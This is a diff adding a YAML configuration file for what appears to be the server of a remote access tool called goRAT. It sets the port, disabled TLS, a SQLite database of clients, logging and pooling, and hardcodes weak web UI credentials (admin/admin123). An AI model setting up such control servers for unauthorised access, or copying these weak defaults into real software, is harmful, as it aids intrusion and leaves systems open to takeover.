@@ -1,0 +1,49 @@
+# goRAT Server Configuration
+
+# Server address and port
+address: ":8080"
+
+# TLS/SSL Configuration
+tls:
+  # Enable TLS
+  enabled: false
+  # Certificate file path
+  cert_file: ""
+  # Key file path
+  key_file: ""
+  # Set to true if behind a reverse proxy (nginx, etc)
+  behind_proxy: false
+
+# Web UI Configuration
+webui:
+  # Web UI username
+  username: admin
+  # Web UI password
+  password: admin123
+  # Web UI port (usually same as server port)
+  port: 8080
+
+# Database Configuration
+database:
+  # Path to SQLite database
+  path: "./clients.db"
+  # Maximum database connections
+  max_connections: 25
+  # Connection timeout in seconds
+  connection_timeout: 30
+
+# Logging Configuration
+logging:
+  # Log level: debug, info, warn, error
+  level: info
+  # Log format: text or json
+  format: text
+
+# Connection Pool Configuration
+connection_pool:
+  # Maximum pooled connections per remote host
+  max_pooled_conns: 10
+  # Idle timeout in seconds
+  pool_conn_idle_time_seconds: 300
+  # Max connection lifetime in seconds
+  pool_conn_lifetime_seconds: 1800
